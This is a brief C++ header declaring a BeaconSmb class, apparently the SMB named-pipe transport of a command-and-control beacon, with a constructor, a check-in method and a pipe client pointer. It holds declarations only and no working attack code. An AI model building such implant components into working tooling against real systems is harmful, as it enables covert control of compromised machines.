#pragma once

#include "Beacon.hpp"


namespace PipeHandler
{
	class Client;
}

class BeaconSmb : public Beacon
{

public:
	BeaconSmb(std::string& config, const std::string& ip, const std::string& pipeName);
	~BeaconSmb();

private:
	void checkIn();

	PipeHandler::Client* m_clientSmb;

};
